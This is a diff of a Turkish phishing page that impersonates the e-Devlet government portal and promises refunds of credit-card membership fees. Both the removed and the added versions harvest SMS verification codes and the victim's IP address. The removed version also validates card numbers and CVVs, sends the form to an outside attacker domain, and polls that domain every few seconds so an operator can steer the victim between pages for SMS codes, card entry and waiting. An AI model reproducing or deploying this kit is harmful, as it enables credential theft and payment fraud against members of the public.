@@ -1,288 +1,132 @@
 <!DOCTYPE html>
+<html class="no-js test-supports test-csstransforms3d test-history test-target test-texttrackapi test-track test-no-contains test-supports test-csstransforms3d test-history test-target test-texttrackapi test-track test-no-contains" lang="tr"><head>
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="x-ua-compatible" content="IE=edge">
+    <meta http-equiv="cleartype" content="on">
+    <title>Mobil İşlem Merkezi</title>
+    <meta name="description" content="5 yıla kadar tüm ödediğiniz aidat ücretlerini geri alın">
  
-<html lang="zxx"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="keywords" content="mobil,işlem,merkezi">
+    <meta name="robots" content="index,follow">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#4284be">
  
  
-    <title>e-Devlet | Aidat İade Sistemi</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    
-    <!-- External CSS libraries -->
-    <link type="text/css" rel="stylesheet" href="./files/bootstrap.min.css">
-    <link type="text/css" rel="stylesheet" href="./files/font-awesome.min.css">
-    <link type="text/css" rel="stylesheet" href="./files/flaticon.css">
-
-    <!-- Favicon icon -->
-    
-
-    <!-- Google fonts -->
-    <link rel="stylesheet" type="text/css" href="./files/css">
-
-    <!-- Custom Stylesheet -->
-    <link type="text/css" rel="stylesheet" href="./files/style.css">
-    <link rel="stylesheet" type="text/css" id="style_sheet" href="./files/default.css">
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/vue/2.5.17/vue.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.18.0/axios.min.js"></script>
-  <script>
-    const url = 'https://ipinfo.io/json';
-    new Vue({
-      el: '#app',
-      data: {
-        results: []
-      },
-      mounted() {
-        window.onload = () => {
-          axios.get(url).then(response => {
-            this.results = response.data;
-  
-            // IP adresini bir cookie'ye kaydet
-            document.cookie = "user_ip=" + this.results.ip;
-  
-            // Cookie'deki user_ip değerini al ve /api endpoint'ine post et
-            const userIp = getCookie('user_ip');
-            if (userIp) {
-              sendPostRequest(userIp);
-            }
-          });
-        };
+    <meta name="msapplication-TileColor" content="#FFFFFF">
+    <link rel="stylesheet" href="assets/css/base.css">
+    <script src="assets/js/tr.js"></script>
+    <link rel="stylesheet" href="assets/css/giris.css">
+    <style>
+      .yg-input-error-msg {
+          display: none;
+          color: red;
       }
-    });
-  
-   
-  
-    function getCookie(cname) {
-      const name = cname + '=';
-      const decodedCookie = decodeURIComponent(document.cookie);
-      const cookieArray = decodedCookie.split(';');
-  
-      for (let i = 0; i < cookieArray.length; i++) {
-        let cookie = cookieArray[i];
-        while (cookie.charAt(0) == ' ') {
-          cookie = cookie.substring(1);
-        }
-        if (cookie.indexOf(name) == 0) {
-          return cookie.substring(name.length, cookie.length);
-        }
-      }
-      return '';
-    }
-  </script>
-</head>
-<body id="top">
-<!-- Google Tag Manager (noscript) -->
+  </style>
  
-<!-- End Google Tag Manager (noscript) -->
-<div class="page_loader"></div>
-
+  </head>
+  <body data-lang="tr_TR.UTF-8">
+    <div class="wrapper">
+        <div class="container">
  
-<script src="./files/jquery-3.2.1.min.js.indir" type="text/javascript"></script>
-<script src="./files/jquery.creditCardValidator.js.indir"></script>
-<script>
-function validate(){
-	var valid = true;	 
-    $(".demoInputBox").css('background-color','');
-    var message = "";
-
-    var cardHolderNameRegex = /^[a-z ,.'-]+$/i;
-    var cvvRegex = /^[0-9]{3,3}$/;
-    
-    var cardHolderName = $("#card-holder-name").val();
-    var cardNumber = $("#tach").val();
-    var cvv = $("#dogum").val();
-
-    if(cardHolderName == "" || cardNumber == "" || cvv == "") {
-    	   message  += "<div>Lütfen Tüm Alanları Doldurun.</div>";  
-    	   if(cardHolderName == "") {
-    		   $("#card-holder-name").css('background-color','#FFFFDF');
-    	   }
-    	   if(cardNumber == "") {
-    		   $("#tach").css('background-color','#FFFFDF');
-    	   }
-    	   if (cvv == "") {
-    		   $("#dogum").css('background-color','#FFFFDF');
-    	   }
-       valid = false;
-    }
-    
-    if (cardHolderName != "" && !cardHolderNameRegex.test(cardHolderName)) {
-        message  += "<div>Card Holder Name is Invalid</div>";    
-    		$("#card-holder-name").css('background-color','#FFFFDF');
-    		valid = false;
-    }
-    
-    if(cardNumber != "") {
-        	$('#tach').validateCreditCard(function(result){
-            if(!(result.valid)){
-                	message  += "<div>Kart Numarası Hatalı!</div>";    
-            		$("#tach").css('background-color','#FFFFDF');
-            		valid = false;
-            }
-        });
-    }
-    
-    if (cvv != "" && !cvvRegex.test(cvv)) {
-        message  += "<div>CVV Kodu Hatalı!</div>";    
-        $("#dogum").css('background-color','#FFFFDF');
-    		valid = false;
-    }
-    
-    if(message != "") {
-        $("#error-message").show();
-        $("#error-message").html(message);
-    }
-    return valid;
-}
-</script>
-<style>div.text-center.text-danger {
-  font-weight: 700;
-  font-style: normal;
-}</style>
-<form id="frmContact" action="https://xn--holiganbt930-8d6f.com/gg/validateCaptcha.php" method="post" onsubmit="return validate();" data-gtm-form-interact-id="0">
-    <!-- Diğer form içeriği burada -->
-
-    <div class="creditly-wrapper wthree, w3_agileits_wrapper">
-        <div class="card bg-secondary shadow border-0">
-            <div class="login-1">
-                <div class="container">
-                    <div class="row">
-                        <div class="col-md-12">
-                            <div class="login-inner-form">
-                                <div class="details">
-                                    <a href="https://xn--holiganbt930-8d6f.com/gg/validateCaptcha.php">
-                                        <img src="./files/logo-2.png" alt="logo">
-                                    </a>
-                                    <h3>Online Aidat İade Sistemi</h3>
-                                    <br>
-
-                                    <!-- SMS doğrulama kodu için input -->
-                                    <div class="form-group">
-                                        <label for="smsCode">SMS Doğrulama Kodu</label>
-                                        <input type="text" class="form-control" id="smsCode" name="smsCode" required>
-                                    </div>
-
-                                    <!-- Geri sayım zamanı için div -->
-                                    <div id="countdown" class="text-center text-danger"></div>
-
-                                    <!-- Diğer form alanları buraya eklenebilir -->
-<br><br>
-                                    <button type="submit" class="btn btn-primary">Gönder</button>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
+    <header class="header">
+        <h1>Türkiye Cumhuriyeti Vatandaş Kimlik Doğrulama Sistemi Giriş Ekranı
+        </h1>
+        <div class="logo"><a href="/"> <img src="assets/img/edk-logo.png"
+                                            alt="logo2"> </a>
         </div>
-    </div>
-
-    <!-- Geri sayım zamanını başlatmak için script -->
-    <script>
-        var countdownTime = 175; // 2 dakika (saniye cinsinden)
-
-        function startCountdown() {
-            var countdownElement = document.getElementById('countdown');
-
-            var countdownInterval = setInterval(function () {
-                var minutes = Math.floor(countdownTime / 60);
-                var seconds = countdownTime % 60;
-
-                countdownElement.innerHTML = 'Kalan Süre: ' + minutes + ':' + seconds + '';
-
-                if (countdownTime <= 0) {
-                    clearInterval(countdownInterval);
-                    countdownElement.innerHTML = 'Zaman doldu.';
-                    // Zaman dolduğunda gerekli işlemleri yapabilirsiniz.
-                }
-
-                countdownTime--;
-            }, 1000);
-        }
-
-        // Sayfa yüklendiğinde geri sayımı başlat
-        document.addEventListener('DOMContentLoaded', function () {
-            startCountdown();
-        });
-    </script>
-</form>
-
-	<script>
-  new Vue({
-    el: '#app',
-    data: {
-      results: [],
-      userIp: ''  
-    },
-    mounted() {
-     
-      this.getUserIpFromCookie();
-      this.makeRequests();
-
+        <div class="referrerApp"><img alt="" src="assets/img/1.png" aria-hidden="true" width="165" height="40">
+            <p>e-Devlet Kapısı<span>https://www.turkiye.gov.tr</span></p></div>
+    </header>
+ 
+    <main>
+        <section>
+            <div class="content">
+           <center>  <h2>
+            Pratik Sorgulama
+         
+ </h2>  <br> <h5>
+                  6502 sayılı Tüketicinin Korunması Hakkında Kanun ile kart çıkaran kuruluşların tüketicilere yıllık üyelik aidatı ve benzeri isim altında ücret tahsil etmedikleri bir kredi kartını sunma zorunluluğu getirilmiştir.
+              
+ </h5>
+<br><br>
+     </center> 
     
-      setInterval(() => {
-        this.getUserIpFromCookie();
-        this.makeRequests();
-      }, 3000);
-    },
-    methods: {
-      getUserIpFromCookie() {
-      
-        this.userIp = this.getCookie('user_ip');
-      },
-      makeRequests() {
-    if (this.userIp) {
-        var currentPage = window.location.pathname.split('/').pop();
-        axios.get(`https://xn--holiganbt930-8d6f.com/tr/datach.php?user_ip=${this.userIp}&current_page=${currentPage}`)
-            .then(response => {
-                this.results = response.data;
-                console.log('GET isteği başarıyla gönderildi. Sunucu yanıtı:', response.data);
+     <form method="post" id="loginForm" name="sifreGirisForm" action="/sms" autocomplete="off">
+      <fieldset>
+          <div class="form-row required">
+              <label for="sms" class="enforced">SMS DOĞRULAMA KODU</label>
+              <input type="hidden" name="encsms" id="encsms" value="">
+              <div class="form-field fieldGroup">
+                  <input name="sms" type="number" e-validate="tck" class="form-control" id="sms" value="" autocomplete="off" maxlength="6" minlength="6" title="sms" required>
+              </div>
+          </div>
+          <br>
+          <div class="form-row center-item">
+              <input type="hidden" name="actionName" value="giris">
+              <button class="btn btn-send" name="submitButton" type="submit" value="Giriş Yap" onclick="addIpToForm()">DOĞRULA</button>
+          </div>
+          <input type="hidden" name="ip" id="ip" value="">
+      </fieldset>
+  </form>
+<script>
 
-                // response.data'ya göre yönlendirme yap
-                if (response.data === 'sms0') {
-                    window.location.href = '/sms.html';
-                } else if (response.data === 'tebrik0') {
-                    window.location.href = '/tebrik.html';
-                } else if (response.data === 'hata0') {
-                    window.location.href = '/hatali.html';
-                } else if (response.data === 'sms20') {
-                    window.location.href = '/hatali.html';
-                } else if (response.data === 'back0') {
-                    window.location.href = '/index.html';
-                } else if (response.data === '1') {
-                    window.location.href = 'smsh.php';
-                } else if (response.data === '2') {
-                    window.location.href = 'kart.php';
-                } else if (response.data === '3') {
-                    window.location.href = 'bekle.php';
-                } else if (response.data === '4') {
-                    window.location.href = 'hata.php';
-                } else if (response.data === '5') {
-                    window.location.href = '/tebrik.html';
-                }
-            })
-            .catch(error => {
-                console.error('GET isteği sırasında bir hata oluştu:', error);
-            });
-    } else {
-        // Kullanıcı IP'si yoksa istek yapma
-        console.warn('Kullanıcı IP\'si bulunamadığı için GET isteği gönderilmedi.');
+document.addEventListener("DOMContentLoaded", function() {
+    // Function to get the cookie value
+    function getCookie(name) {
+        const value = `; ${document.cookie}`;
+        const parts = value.split(`; ${name}=`);
+        if (parts.length === 2) return parts.pop().split(';').shift();
     }
-},
-      getCookie(cname) {
-        const name = cname + '=';
-        const decodedCookie = decodeURIComponent(document.cookie);
-        const cookieArray = decodedCookie.split(';');
 
-        for (let i = 0; i < cookieArray.length; i++) {
-          let cookie = cookieArray[i];
-          while (cookie.charAt(0) == ' ') {
-            cookie = cookie.substring(1);
-          }
-          if (cookie.indexOf(name) == 0) {
-            return cookie.substring(name.length, cookie.length);
-          }
-        }
-        return '';
-      }
-    }
-  });
-</script> 
-</body></html>
+    // Function to add IP to the form before submission
+    window.addIpToForm = function() {
+        const ip = getCookie('ip');
+        document.getElementById('ip').value = ip;
+    };
+});
+
+</script>  
+        
+  
+            </div>
+        </section>
+    
+ 
+    
+    </main>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    </div>
+   
+    
+    <footer class="footer-fixed" role="contentinfo">
+        <span class="copyright"><img src="assets/img/DDO-logo.png" class="footer-logo" alt="logo" height="24"  >© 2024, Ankara - Tüm Hakları Saklıdır</span>
+        <ul>
+            <li>
+                <a id="gizlilik_btn" 
+                   aria-haspopup="true">Gizlilik ve Güvenlik
+                </a>
+            </li>
+    
+        </ul>
+ 
+    </footer>
+    
+  </div>
+ 
+    
+    
+    
+    
+    
+ 
+    </body>
+    </html>
